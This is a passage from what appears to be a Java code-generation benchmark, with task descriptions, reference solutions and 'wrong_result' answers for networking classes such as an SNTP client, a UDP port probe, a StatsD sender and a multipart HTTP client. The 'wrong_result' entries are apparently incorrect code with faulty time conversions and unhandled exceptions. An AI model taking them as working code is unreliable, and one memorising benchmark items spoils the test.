    "Instruction": "Task Description: Implement a Java class that handles SNTP (Simple Network Time Protocol) requests to synchronize time with an NTP server using UDP communication. The class should validate server responses and provide accurate time synchronization while handling potential errors.\n\nClass Description: The SntpImpl class implements the Sntp interface and provides functionality to request time from an NTP server. It uses UDP communication to send and receive NTP packets, validates server responses against specified thresholds, and calculates time offsets. The class includes helper methods for reading/writing NTP protocol fields and converting between different time representations.\n\nAttributes:\n- NTP_PORT: int - The standard NTP port (123)\n- NTP_MODE: int - The NTP mode (3 for client)\n- NTP_VERSION: int - The NTP version (3)\n- NTP_PACKET_SIZE: int - The size of NTP packets (48 bytes)\n- OFFSET_1900_TO_1970: long - The seconds offset between 1900 and 1970 epochs\n\nMethods:\n- requestTime(InetAddress, float, float, int, int, SntpEventListener) -> SntpResult - Requests time from specified NTP server with validation parameters and timeout\n- writeNtpVersion(byte[]) -> void - Writes NTP version and mode into the buffer\n- writeTimeStamp(byte[], int, long) -> void - Writes a timestamp into the buffer at specified offset\n- readTimeStamp(byte[], int) -> long - Reads a timestamp from the buffer at specified offset\n- read(byte[], int) -> long - Reads 4 bytes from buffer as a long value\n- ui(byte) -> int - Converts byte to unsigned integer\n- doubleMillis(long) -> double - Converts fixed-point NTP format to milliseconds",
    "Canonical_solution": "import android.os.SystemClock;\nimport com.instacart.truetime.InvalidNtpServerResponseException;\nimport com.instacart.truetime.SntpEventListener;\nimport org.jetbrains.annotations.NotNull;\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class SntpImpl implements Sntp {\n\n    private static final int NTP_PORT = 123;\n    private static final int NTP_MODE = 3;\n    private static final int NTP_VERSION = 3;\n    private static final int NTP_PACKET_SIZE = 48;\n    private static final long OFFSET_1900_TO_1970 = ((365L * 70L) + 17L) * 24L * 60L * 60L;\n\n    @NotNull\n    @Override\n    public synchronized SntpResult requestTime(\n            InetAddress address,\n            float rootDelayMax,\n            float rootDispersionMax,\n            int serverResponseDelayMax,\n            int timeoutInMillis,\n            SntpEventListener listener\n    ) throws IOException {\n\n        listener.sntpRequest(address);\n        DatagramSocket socket = null;\n\n        try {\n            socket = new DatagramSocket();\n            socket.setSoTimeout(timeoutInMillis);\n            byte[] buffer = new byte[NTP_PACKET_SIZE];\n            DatagramPacket request = new DatagramPacket(buffer, buffer.length, address, NTP_PORT);\n\n            writeNtpVersion(buffer);\n            long requestTime = System.currentTimeMillis();\n            long requestTicks = SystemClock.elapsedRealtime();\n            writeTimeStamp(buffer, INDEX_TRANSMIT_TIME, requestTime);\n            socket.send(request);\n\n            DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n            socket.receive(response);\n            long responseTicks = SystemClock.elapsedRealtime();\n\n            long originateTime = readTimeStamp(buffer, INDEX_ORIGINATE_TIME);\n            long receiveTime = readTimeStamp(buffer, INDEX_RECEIVE_TIME);\n            long transmitTime = readTimeStamp(buffer, INDEX_TRANSMIT_TIME);\n            long responseTime = requestTime + (responseTicks - requestTicks);\n\n            double rootDelay = doubleMillis(read(buffer, INDEX_ROOT_DELAY));\n            if (rootDelay > rootDelayMax) {\n                throw new InvalidNtpServerResponseException(\n                        \"Invalid response from NTP server. %s violation. %f [actual] > %f [expected]\",\n                        \"root_delay\",\n                        (float) rootDelay,\n                        rootDelayMax);\n            }\n\n            double rootDispersion = doubleMillis(read(buffer, INDEX_ROOT_DISPERSION));\n            if (rootDispersion > rootDispersionMax) {\n                throw new InvalidNtpServerResponseException(\n                        \"Invalid response from NTP server. %s violation. %f [actual] > %f [expected]\",\n                        \"root_dispersion\",\n                        (float) rootDispersion,\n                        rootDispersionMax);\n            }\n\n            listener.sntpRequestSuccessful(address);\n            return new SntpResult(new long[]{\n                    originateTime,\n                    receiveTime,\n                    transmitTime,\n                    responseTime,\n                    read(buffer, INDEX_ROOT_DELAY),\n                    read(buffer, INDEX_ROOT_DISPERSION),\n                    buffer[1] & 0xff,\n                    responseTicks\n            });\n\n        } catch (Exception e) {\n            listener.sntpRequestFailed(address, e);\n            throw e;\n        } finally {\n            if (socket != null) {\n                socket.close();\n            }\n        }\n    }\n\n    private void writeNtpVersion(byte[] buffer) {\n        buffer[0] = NTP_MODE | (NTP_VERSION << 3);\n    }\n\n    private void writeTimeStamp(byte[] buffer, int offset, long time) {\n        long seconds = time / 1000L;\n        long milliseconds = time - seconds * 1000L;\n        seconds += OFFSET_1900_TO_1970;\n\n        buffer[offset++] = (byte) (seconds >> 24);\n        buffer[offset++] = (byte) (seconds >> 16);\n        buffer[offset++] = (byte) (seconds >> 8);\n        buffer[offset++] = (byte) (seconds >> 0);\n\n        long fraction = milliseconds * 0x100000000L / 1000L;\n        buffer[offset++] = (byte) (fraction >> 24);\n        buffer[offset++] = (byte) (fraction >> 16);\n        buffer[offset++] = (byte) (fraction >> 8);\n        buffer[offset] = (byte) (Math.random() * 255.0);\n    }\n\n    private long readTimeStamp(byte[] buffer, int offset) {\n        long seconds = read(buffer, offset);\n        long fraction = read(buffer, offset + 4);\n        return ((seconds - OFFSET_1900_TO_1970) * 1000) + ((fraction * 1000L) / 0x100000000L);\n    }\n\n    private long read(byte[] buffer, int offset) {\n        return ((long) ui(buffer[offset]) << 24) +\n               ((long) ui(buffer[offset + 1]) << 16) +\n               ((long) ui(buffer[offset + 2]) << 8) +\n               (long) ui(buffer[offset + 3]);\n    }\n\n    private int ui(byte b) {\n        return b & 0xFF;\n    }\n\n    private double doubleMillis(long fix) {\n        return fix / 65.536D;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class SntpImpl implements Sntp {\n    private static final int NTP_PORT = 123;\n    private static final int NTP_MODE = 3;\n    private static final int NTP_VERSION = 3;\n    private static final int NTP_PACKET_SIZE = 48;\n    private static final long OFFSET_1900_TO_1970 = 2208988800L;\n\n    @Override\n    public SntpResult requestTime(InetAddress serverAddress, float maxRoundTripTime, float maxOffset, int timeout, int retryCount, SntpEventListener listener) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        socket.setSoTimeout(timeout);\n        byte[] packet = new byte[NTP_PACKET_SIZE];\n        writeNtpVersion(packet);\n        for (int i = 0; i < 4; i++) {\n            packet[4 + i] = 0;\n        }\n        long now = System.currentTimeMillis() / 1000;\n        writeTimeStamp(packet, 8, now);\n        DatagramPacket request = new DatagramPacket(packet, packet.length, serverAddress, NTP_PORT);\n        socket.send(request);\n        byte[] response = new byte[NTP_PACKET_SIZE];\n        DatagramPacket reply = new DatagramPacket(response, response.length);\n        boolean success = false;\n        SntpResult result = null;\n        for (int i = 0; i < retryCount; i++) {\n            try {\n                socket.receive(reply);\n                success = true;\n                break;\n            } catch (SocketTimeoutException e) {\n                if (i == retryCount - 1) {\n                    throw e;\n                }\n            }\n        }\n        if (!success) {\n            throw new IOException(\"No response from server\");\n        }\n        long receiveTimestamp = readTimeStamp(response, 16);\n        long transmitTimestamp = readTimeStamp(response, 24);\n        long originTimestamp = readTimeStamp(packet, 8);\n        float roundTripTime = (float) (transmitTimestamp - receiveTimestamp);\n        if (roundTripTime > maxRoundTripTime) {\n            throw new IOException(\"Round trip time exceeds maximum allowed\");\n        }\n        float offset = (float) (((transmitTimestamp - receiveTimestamp) / 2) - (originTimestamp - receiveTimestamp));\n        if (Math.abs(offset) > maxOffset) {\n            throw new IOException(\"Offset exceeds maximum allowed\");\n        }\n        double offsetMillis = offset * 1000.0;\n        result = new SntpResult(offsetMillis, System.currentTimeMillis());\n        listener.onResult(result);\n        return result;\n    }\n\n    private void writeNtpVersion(byte[] buffer) {\n        buffer[0] = (byte) ((NTP_VERSION << 3) | NTP_MODE);\n    }\n\n    private void writeTimeStamp(byte[] buffer, int offset, long timestamp) {\n        long ntpTime = timestamp + OFFSET_1900_TO_1970;\n        int ntpInt = (int) (ntpTime & 0xFFFFFFFF);\n        buffer[offset] = (byte) (ntpInt >> 24);\n        buffer[offset + 1] = (byte) (ntpInt >> 16);\n        buffer[offset + 2] = (byte) (ntpInt >> 8);\n        buffer[offset + 3] = (byte) ntpInt;\n    }\n\n    private long readTimeStamp(byte[] buffer, int offset) {\n        int value = (buffer[offset] & 0xFF) << 24 |\n                    (buffer[offset + 1] & 0xFF) << 16 |\n                    (buffer[offset + 2] & 0xFF) << 8 |\n                    (buffer[offset + 3] & 0xFF);\n        return (long) value;\n    }\n\n    private long read(byte[] buffer, int offset) {\n        long value = 0;\n        for (int i = 0; i < 4; i++) {\n            value = (value << 8) | (buffer[offset + i] & 0xFF);\n        }\n        return value;\n    }\n\n    public int ui(byte b) {\n        return b & 0xFF;\n    }\n\n    public double doubleMillis(long ntpTimestamp) {\n        return (ntpTimestamp - OFFSET_1900_TO_1970) * 1000.0;\n    }\n}"
  },
  {
    "Task_id": 596,
    "Instruction": "Task Description: Create a UDP communication class that can function as either a server or client, handling packet transmission and reception with proper error handling and resource management.\n\nClass Description: UDPCommunicator is a class that encapsulates UDP communication functionality, allowing an instance to operate as either a server (receiving packets) or client (sending packets). The class manages socket creation, packet transmission/reception, and proper cleanup.\n\nAttributes:\n- socket: DatagramSocket - The underlying UDP socket used for communication\n- isServer: boolean - Flag indicating whether this instance operates as a server (true) or client (false)\n\nMethods:\n- UDPCommunicator(boolean isServer, int port) -> void - Constructor that initializes the UDP socket. Binds to specified port if operating as server.\n- sendPacket(byte[] data, String destAddress, int destPort) -> void - Sends a UDP packet to the specified destination (client mode only). Throws IOException on network errors and IllegalStateException if called in server mode.\n- receivePacket() -> byte[] - Receives a UDP packet (server mode only). Returns the packet data as byte array. Throws IOException on network errors and IllegalStateException if called in client mode.\n- close() -> void - Closes the socket and releases system resources. Safe to call multiple times.",
    "Canonical_solution": "import java.net.DatagramSocket;\nimport java.net.DatagramPacket;\nimport java.net.InetSocketAddress;\nimport java.net.SocketException;\nimport java.io.IOException;\n\npublic class UDPCommunicator {\n    private DatagramSocket socket;\n    private boolean isServer;\n\n    public UDPCommunicator(boolean isServer, int port) throws SocketException {\n        this.isServer = isServer;\n        this.socket = new DatagramSocket(null);\n        if (isServer) {\n            socket.bind(new InetSocketAddress(\"0.0.0.0\", port));\n        }\n    }\n\n    public void sendPacket(byte[] data, String destAddress, int destPort) throws IOException {\n        if (isServer) {\n            throw new IllegalStateException(\"Server cannot send packets without first receiving\");\n        }\n        DatagramPacket packet = new DatagramPacket(data, data.length, \n            new InetSocketAddress(destAddress, destPort));\n        socket.send(packet);\n    }\n\n    public byte[] receivePacket() throws IOException {\n        if (!isServer) {\n            throw new IllegalStateException(\"Client should not be receiving packets\");\n        }\n        byte[] buffer = new byte[800];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        return packet.getData();\n    }\n\n    public void close() {\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class UDPCommunicator {\n    private DatagramSocket socket;\n    private boolean isServer;\n\n    public UDPCommunicator(boolean isServer, int port) throws IOException {\n        this.isServer = isServer;\n        if (isServer) {\n            socket = new DatagramSocket(port);\n        } else {\n            socket = new DatagramSocket();\n        }\n    }\n\n    public void sendPacket(byte[] data, String destAddress, int destPort) throws IOException {\n        if (isServer) {\n            throw new IllegalStateException(\"Cannot send packets in server mode\");\n        }\n        if (data == null) {\n            throw new IllegalArgumentException(\"Data cannot be null\");\n        }\n        if (destAddress == null || destAddress.isEmpty()) {\n            throw new IllegalArgumentException(\"Destination address cannot be null or empty\");\n        }\n        if (destPort <= 0 || destPort > 65535) {\n            throw new IllegalArgumentException(\"Invalid destination port\");\n        }\n        DatagramPacket packet = new DatagramPacket(data, data.length, InetAddress.getByName(destAddress), destPort);\n        socket.send(packet);\n    }\n\n    public byte[] receivePacket() throws IOException {\n        if (!isServer) {\n            throw new IllegalStateException(\"Cannot receive packets in client mode\");\n        }\n        byte[] buffer = new byte[65535];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        return Arrays.copyOf(buffer, packet.getLength());\n    }\n\n    public void close() {\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n            socket = null;\n        }\n    }\n}"
  },
  {
    "Task_id": 597,
    "Instruction": "Task Description: Implement a UDP port probing function to check if a specific UDP port on a remote host is reachable and responsive.\n\nFunction Description: The function sends a UDP \"PING\" packet to a specified host and port, then waits for a response. It determines port reachability based on whether a response is received (port is open/reachable) or if specific exceptions occur (port is unreachable or other errors).\n\nInput:\n- host: String - The target hostname or IP address to probe\n- portMapping: PortMapping - An object containing the external port number to probe (accessed via getExternalPort())\n\nOutput:\n- boolean - Returns true if the port is reachable (response received or timeout occurred), false if the port is unreachable or other errors occurred\n\nThe function handles the following cases:\n1. SocketTimeoutException: Returns true (port may be open but no response received)\n2. PortUnreachableException: Returns false (port definitely unreachable)\n3. Other Socket/IO exceptions: Returns false after logging the error\n4. Successful response: Returns false (unexpected response case)",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.PortUnreachableException;\nimport java.net.SocketException;\nimport java.net.SocketTimeoutException;\nimport java.io.IOException;\n\nprivate boolean probeUdpPort(String host, PortMapping portMapping) {\n    final Integer port = portMapping.getExternalPort();\n\n    try {\n        final byte[] pingData = \"PING\".getBytes(\"UTF-8\");\n        final DatagramSocket serverSocket = new DatagramSocket(0);\n        final SocketAddress socketAddr = new InetSocketAddress(host, port);\n        serverSocket.connect(socketAddr);\n\n        final InetAddress address = InetAddress.getByName(host);\n        final DatagramPacket sendPacket =\n            new DatagramPacket(pingData, pingData.length, address, port);\n        serverSocket.send(sendPacket);\n\n        final byte[] receiveData = new byte[8];\n        final DatagramPacket receivePacket =\n            new DatagramPacket(receiveData, receiveData.length);\n        serverSocket.setSoTimeout(200);\n        serverSocket.receive(receivePacket);\n\n    } catch (SocketTimeoutException e) {\n        return true;\n    } catch (PortUnreachableException e) {\n        return false;\n    } catch (SocketException e) {\n        LOG.warn(e.getMessage(), e);\n        return false;\n    } catch (IOException e) {\n        LOG.warn(e.getMessage(), e);\n        return false;\n    }\n    return false;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 2,
    "wrong_result": "public boolean probeUDP(String host, PortMapping portMapping) {\n    try {\n        int port = portMapping.getExternalPort();\n        byte[] sendData = \"PING\".getBytes();\n        InetAddress address = InetAddress.getByName(host);\n        DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, address, port);\n        DatagramSocket socket = new DatagramSocket();\n        socket.setSoTimeout(1000);\n        socket.send(sendPacket);\n        byte[] receiveData = new byte[1024];\n        DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n        socket.receive(receivePacket);\n        return false;\n    } catch (SocketTimeoutException e) {\n        return true;\n    } catch (IOException e) {\n        System.err.println(\"IO exception: \" + e.getMessage());\n        return false;\n    }\n}"
  },
  {
    "Task_id": 598,
    "Instruction": "Task Description: Create a Java class that implements a StatsD client using UDP protocol for sending metrics to a StatsD server. The class should handle metric batching and asynchronous sending to avoid blocking the main application thread.\n\nClass Description: The Statsd class is a singleton that provides asynchronous metric sending capability to a StatsD server via UDP. It uses a background thread to batch metrics and send them efficiently. The class handles connection setup, error cases, and metric aggregation.\n\nAttributes:\n- CHARSET: [Charset] - The character encoding used for sending metrics (US_ASCII)\n- e: [ExecutorService] - Single thread executor for asynchronous metric processing\n- qManager: [Implicit Queue Manager] - Manages the queue of metrics to be sent (implied by usage but not shown in attributes)\n\nMethods:\n- getInstance(): () -> [Statsd] - Returns the singleton instance of the StatsD client\n- <constructor>: () -> [Statsd] - Private constructor that initializes the background thread for metric processing\n- <background thread>: () -> [void] - Internal method that continuously processes metrics from the queue, batches them, and sends to the StatsD server via UDP\n\nNote: The actual queue management implementation (qManager) is not shown in the provided code but is implied by the usage of getQ() and drainTo() methods. The class handles UDP socket creation, packet preparation, and error cases for host resolution and socket operations.",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.nio.charset.Charset;\nimport java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.Collection;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport org.openjdk.btrace.core.BTraceRuntime;\nimport org.openjdk.btrace.core.SharedSettings;\n\npublic final class Statsd {\n  private static final Charset CHARSET = StandardCharsets.US_ASCII;\n  private final ExecutorService e = Executors.newSingleThreadExecutor(\n      r -> {\n        Thread t = new Thread(r, \"jStatsD Client Submitter\");\n        t.setDaemon(true);\n        return t;\n      });\n\n  @SuppressWarnings(\"FutureReturnValueIgnored\")\n  private Statsd() {\n    e.submit(\n        () -> {\n          DatagramSocket ds = null;\n          boolean entered = BTraceRuntime.enter();\n          try {\n            ds = new DatagramSocket();\n            DatagramPacket dp = new DatagramPacket(new byte[0], 0);\n            try {\n              dp.setAddress(InetAddress.getByName(SharedSettings.GLOBAL.getStatsdHost()));\n            } catch (UnknownHostException ex) {\n              System.err.println(\n                  \"[statsd] invalid host defined: \" + SharedSettings.GLOBAL.getStatsdHost());\n              dp.setAddress(InetAddress.getLoopbackAddress());\n            } catch (SecurityException ex) {\n              dp.setAddress(InetAddress.getLoopbackAddress());\n            }\n            dp.setPort(SharedSettings.GLOBAL.getStatsdPort());\n\n            while (true) {\n              Collection<String> msgs = new ArrayList<>();\n              msgs.add(qManager.getQ().take());\n              qManager.getQ().drainTo(msgs);\n\n              StringBuilder sb = new StringBuilder();\n              for (String m : msgs) {\n                if (sb.length() + m.length() < 511) {\n                  sb.append(m).append('\\n');\n                } else {\n                  dp.setData(sb.toString().getBytes(CHARSET));\n                  ds.send(dp);\n                  sb.setLength(0);\n                }\n              }\n              if (sb.length() > 0) {\n                dp.setData(sb.toString().getBytes(CHARSET));\n                ds.send(dp);\n              }\n            }\n          } catch (IOException | InterruptedException ex) {\n            ex.printStackTrace();\n          } finally {\n            if (entered) {\n              BTraceRuntime.leave();\n            }\n          }\n        });\n  }\n\n  public static Statsd getInstance() {\n    return Singleton.INSTANCE;\n  }\n\n  private static final class Singleton {\n    private static final Statsd INSTANCE = new Statsd();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class Statsd {\n    private static final Charset CHARSET = Charset.forName(\"US_ASCII\");\n    private static final Statsd INSTANCE = new Statsd();\n    private final ExecutorService e;\n    private final BlockingQueue<String> queue;\n    private final DatagramSocket socket;\n    private final String host;\n    private final int port;\n\n    private Statsd() {\n        this.host = \"localhost\";\n        this.port = 8125;\n        this.queue = new LinkedBlockingQueue<>();\n        this.e = Executors.newSingleThreadExecutor();\n        this.socket = createSocket();\n        e.execute(this::backgroundThread);\n    }\n\n    private DatagramSocket createSocket() {\n        try {\n            return new DatagramSocket();\n        } catch (SocketException ex) {\n            throw new RuntimeException(\"Failed to create UDP socket\", ex);\n        }\n    }\n\n    private void backgroundThread() {\n        while (true) {\n            try {\n                List<String> batch = new ArrayList<>();\n                queue.drainTo(batch);\n                if (!batch.isEmpty()) {\n                    sendBatch(batch);\n                }\n                Thread.sleep(100);\n            } catch (InterruptedException ex) {\n                Thread.currentThread().interrupt();\n                break;\n            } catch (Exception ex) {\n                ex.printStackTrace();\n            }\n        }\n    }\n\n    private void sendBatch(List<String> batch) {\n        StringBuilder sb = new StringBuilder();\n        for (String metric : batch) {\n            sb.append(metric).append(\"\\n\");\n        }\n        byte[] buffer = sb.toString().getBytes(CHARSET);\n        InetAddress address = InetAddress.getByName(host);\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, port);\n        try {\n            socket.send(packet);\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n    }\n\n    public static Statsd getInstance() {\n        return INSTANCE;\n    }\n\n    public void increment(String name, long count, double rate) {\n        queue.offer(String.format(\"%s:%d|c|@%f\", name, count, rate));\n    }\n}"
  },
  {
    "Task_id": 599,
    "Instruction": "Task Description: Create a Java class that implements a UDP-based output stream appender for logging purposes, capable of sending log messages to a specified host and port via UDP packets.\n\nClass Description: DropwizardUdpSocketAppender is a specialized OutputStreamAppender that sends log messages over UDP to a remote server. It extends OutputStreamAppender to provide UDP socket functionality while maintaining compatibility with logging frameworks.\n\nAttributes:\n- host: String - The target hostname or IP address where UDP packets should be sent\n- port: int - The target port number on the remote host\n\nMethods:\n- DropwizardUdpSocketAppender(String host, int port) -> None - Constructor that initializes the appender with target host and port information\n- start() -> void - Initializes the output stream and starts the appender (overrides parent method)\n- datagramSocketOutputStream(String host, int port) -> OutputStream - Creates and returns a custom OutputStream implementation that sends data via UDP packets\n\nThe custom OutputStream implementation includes:\n- write(int b) -> void - Throws UnsupportedOperationException as UDP doesn't support byte-level writes\n- write(byte[] b, int off, int len) -> void - Sends the specified bytes as a UDP packet to the configured host and port\n- close() -> void - Closes the underlying DatagramSocket",
    "Canonical_solution": "import ch.qos.logback.core.OutputStreamAppender;\nimport ch.qos.logback.core.spi.DeferredProcessingAware;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\n\npublic class DropwizardUdpSocketAppender<E extends DeferredProcessingAware> extends OutputStreamAppender<E> {\n\n    private final String host;\n    private final int port;\n\n    public DropwizardUdpSocketAppender(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    @Override\n    public void start() {\n        setOutputStream(datagramSocketOutputStream(host, port));\n        super.start();\n    }\n\n    protected OutputStream datagramSocketOutputStream(String host, int port) {\n        try {\n            return new OutputStream() {\n                private final DatagramSocket datagramSocket = new DatagramSocket();\n\n                @Override\n                public void write(int b) throws IOException {\n                    throw new UnsupportedOperationException(\"Datagram doesn't work at byte level\");\n                }\n\n                @Override\n                public void write(byte[] b, int off, int len) throws IOException {\n                    datagramSocket.send(new DatagramPacket(b, off, len, InetAddress.getByName(host), port));\n                }\n\n                @Override\n                public void close() throws IOException {\n                    datagramSocket.close();\n                }\n            };\n        } catch (SocketException e) {\n            throw new IllegalStateException(\"Unable to create a datagram socket\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class DropwizardUdpSocketAppender extends OutputStreamAppender<ILoggingEvent> {\n    private final String host;\n    private final int port;\n\n    public DropwizardUdpSocketAppender(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    @Override\n    public void start() {\n        setOutputStream(datagramSocketOutputStream(host, port));\n        super.start();\n    }\n\n    private OutputStream datagramSocketOutputStream(String host, int port) {\n        return new DatagramSocketOutputStream(host, port);\n    }\n\n    private class DatagramSocketOutputStream extends OutputStream {\n        private final InetAddress address;\n        private final int port;\n        private final DatagramSocket socket;\n\n        public DatagramSocketOutputStream(String host, int port) throws UnknownHostException {\n            this.address = InetAddress.getByName(host);\n            this.port = port;\n            this.socket = new DatagramSocket();\n        }\n\n        @Override\n        public void write(int b) throws IOException {\n            throw new UnsupportedOperationException(\"UDP does not support byte-level writes\");\n        }\n\n        @Override\n        public void write(byte[] b, int off, int len) throws IOException {\n            DatagramPacket packet = new DatagramPacket(b, off, len, address, port);\n            socket.send(packet);\n        }\n\n        @Override\n        public void close() throws IOException {\n            if (socket != null) {\n                socket.close();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 60,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for downloading images and handling multipart form data submissions.\n\nClass Description: The HttpClient class provides methods to download images via HTTP POST requests and to construct and send multipart form data (including both text parameters and file attachments) to a server. It handles connection management, request configuration, and response processing.\n\nAttributes:\n- url: String - The target URL for HTTP requests\n- con: HttpURLConnection - The HTTP connection object\n- os: OutputStream - Output stream for writing request data\n- delimiter: String - Boundary delimiter for multipart form data (default \"--\")\n- boundary: String - Unique boundary string for multipart requests (generated with timestamp)\n\nMethods:\n- HttpClient(String url) -> None - Constructor that initializes the client with target URL\n- downloadImage(String imgName) -> byte[] - Downloads an image by sending the image name as a POST parameter and returns the image data as byte array\n- connectForMultipart() -> void - Initializes connection for multipart form data submission\n- addFormPart(String paramName, String value) -> void - Adds a text parameter to multipart form data\n- addFilePart(String paramName, String fileName, byte[] data) -> void - Adds a file attachment to multipart form data\n- finishMultipart() -> void - Finalizes the multipart form data construction\n- getResponse() -> String - Retrieves and returns the server response as a string\n- writeParamData(String paramName, String value) -> void - Internal helper method for writing form parameters",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpClient {\n    private String url;\n    private HttpURLConnection con;\n    private OutputStream os;\n    \n    private String delimiter = \"--\";\n    private String boundary =  \"SwA\"+Long.toString(System.currentTimeMillis())+\"SwA\";\n\n    public HttpClient(String url) {        \n        this.url = url;\n    }\n    \n    public byte[] downloadImage(String imgName) {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        try {\n            HttpURLConnection con = (HttpURLConnection) ( new URL(url)).openConnection();\n            con.setRequestMethod(\"POST\");\n            con.setDoInput(true);\n            con.setDoOutput(true);\n            con.connect();\n            con.getOutputStream().write( (\"name=\" + imgName).getBytes());\n            \n            InputStream is = con.getInputStream();\n            byte[] b = new byte[1024];\n            \n            while ( is.read(b) != -1)\n                baos.write(b);\n            \n            con.disconnect();\n        }\n        catch(Throwable t) {\n            t.printStackTrace();\n        }\n        \n        return baos.toByteArray();\n    }\n\n    public void connectForMultipart() throws Exception {\n        con = (HttpURLConnection) ( new URL(url)).openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setDoInput(true);\n        con.setDoOutput(true);\n        con.setRequestProperty(\"Connection\", \"Keep-Alive\");\n        con.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n        con.connect();\n        os = con.getOutputStream();\n    }\n    \n    public void addFormPart(String paramName, String value) throws Exception {\n        writeParamData(paramName, value);\n    }\n    \n    public void addFilePart(String paramName, String fileName, byte[] data) throws Exception {\n        os.write( (delimiter + boundary + \"\\r\\n\").getBytes());\n        os.write( (\"Content-Disposition: form-data; name=\\\"\" + paramName +  \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\"  ).getBytes());\n        os.write( (\"Content-Type: application/octet-stream\\r\\n\"  ).getBytes());\n        os.write( (\"Content-Transfer-Encoding: binary\\r\\n\"  ).getBytes());\n        os.write(\"\\r\\n\".getBytes());\n   \n        os.write(data);\n        \n        os.write(\"\\r\\n\".getBytes());\n    }\n    \n    public void finishMultipart() throws Exception {\n        os.write( (delimiter + boundary + delimiter + \"\\r\\n\").getBytes());\n    }\n    \n    public String getResponse() throws Exception {\n        InputStream is = con.getInputStream();\n        byte[] b1 = new byte[1024];\n        StringBuffer buffer = new StringBuffer();\n        \n        while ( is.read(b1) != -1)\n            buffer.append(new String(b1));\n        \n        con.disconnect();\n        \n        return buffer.toString();\n    }\n    \n    private void writeParamData(String paramName, String value) throws Exception {\n        os.write( (delimiter + boundary + \"\\r\\n\").getBytes());\n        os.write( \"Content-Type: text/plain\\r\\n\".getBytes());\n        os.write( (\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"\\r\\n\").getBytes());;\n        os.write( (\"\\r\\n\" + value + \"\\r\\n\").getBytes());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpClient {\n    private String url;\n    private HttpURLConnection con;\n    private OutputStream os;\n    private String delimiter = \"--\";\n    private String boundary;\n\n    public HttpClient(String url) {\n        this.url = url;\n        this.boundary = \"boundary_\" + System.currentTimeMillis();\n    }\n\n    public void connectForMultipart() throws IOException {\n        con = (HttpURLConnection) new URL(url).openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n        con.setDoOutput(true);\n        os = con.getOutputStream();\n    }\n\n    public void addFormPart(String paramName, String value) throws IOException {\n        writeParamData(paramName, value);\n    }\n\n    private void writeParamData(String paramName, String value) throws IOException {\n        os.write((delimiter + boundary + \"\\r\\n\").getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"\\r\\n\").getBytes());\n        os.write(\"\\r\\n\".getBytes());\n        os.write(value.getBytes());\n        os.write(\"\\r\\n\".getBytes());\n    }\n\n    public void addFilePart(String paramName, String fileName, byte[] data) throws IOException {\n        os.write((delimiter + boundary + \"\\r\\n\").getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\").getBytes());\n        os.write(\"Content-Type: application/octet-stream\\r\\n\".getBytes());\n        os.write(\"\\r\\n\".getBytes());\n        os.write(data);\n        os.write(\"\\r\\n\".getBytes());\n    }\n\n    public void finishMultipart() throws IOException {\n        os.write((delimiter + boundary + \"--\\r\\n\").getBytes());\n        os.flush();\n        os.close();\n    }\n\n    public String getResponse() throws IOException {\n        try (BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream()))) {\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = br.readLine()) != null) {\n                response.append(line);\n            }\n            return response.toString();\n        }\n    }\n\n    public byte[] downloadImage(String imgName) throws IOException {\n        con = (HttpURLConnection) new URL(url).openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        con.setDoOutput(true);\n        try (OutputStream os = con.getOutputStream()) {\n            os.write((\"imgName=\" + imgName).getBytes());\n        }\n        try (InputStream is = con.getInputStream()) {\n            byte[] buffer = new 